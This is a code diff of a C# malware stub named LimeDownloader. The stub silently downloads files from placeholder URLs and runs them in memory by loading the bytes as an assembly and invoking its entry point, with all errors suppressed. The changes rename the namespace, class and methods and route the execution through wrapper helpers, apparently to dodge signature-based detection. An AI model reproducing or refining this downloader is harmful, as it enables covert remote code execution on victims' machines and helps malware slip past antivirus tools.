@@ -21,11 +21,11 @@ using System.Diagnostics;
 [assembly: Guid("%Guid%")]
 
 
-namespace LimeDownloader_Stub
+namespace LimeDownloader_Stubnamespace
 {
 
 
-    static class Stub
+    static class Stubclass
     {
         //vars
       private static List<string> ListURLS = new List<string>(new string[] { "$URL$" });
@@ -46,7 +46,7 @@ namespace LimeDownloader_Stub
             {
                 try
                 {
-                    DownloadFiles(url);
+                    FetchFiles(url);
                     Thread.Sleep(2500);
                 }
                 catch { }
@@ -93,7 +93,7 @@ namespace LimeDownloader_Stub
 
 #endif
 
-        private static void DownloadFiles(string url)
+        private static void FetchFiles(string url)
         {
             using (WebClient wc = new WebClient())
             {
@@ -111,17 +111,31 @@ namespace LimeDownloader_Stub
         {
             try
             {
-                Assembly Loader = Assembly.Load((byte[])Payload);
-                if (Loader.EntryPoint.GetParameters().Length > 0)
-                {
-                    Loader.EntryPoint.Invoke(null, new object[] { new string[] { null } });
-                }
-                else
-                {
-                    Loader.EntryPoint.Invoke(null, null);
-                }
+                Assembly asm = AppDomain.CurrentDomain.Load((byte[])Payload);
+                MethodInfo Metinf = Entry(asm);
+                object InjObj = asm.CreateInstance(Metinf.Name);
+                object[] parameters = new object[1];
+                if (Metinf.GetParameters().Length == 0)
+                    parameters = null;
+                MethodInfo(Metinf, InjObj, parameters);
             }
             catch { }
+        }
+
+        private static object MethodInfo(MethodInfo meth, object obj1, object[] obj2)
+        {
+            if (meth != null)
+                return meth.Invoke(obj1, obj2);
+            else
+                return false;
+        }
+
+        private static MethodInfo Entry(Assembly obj)
+        {
+            if (obj != null)
+                return obj.EntryPoint;
+            else
+                return null;
         }
 
     }
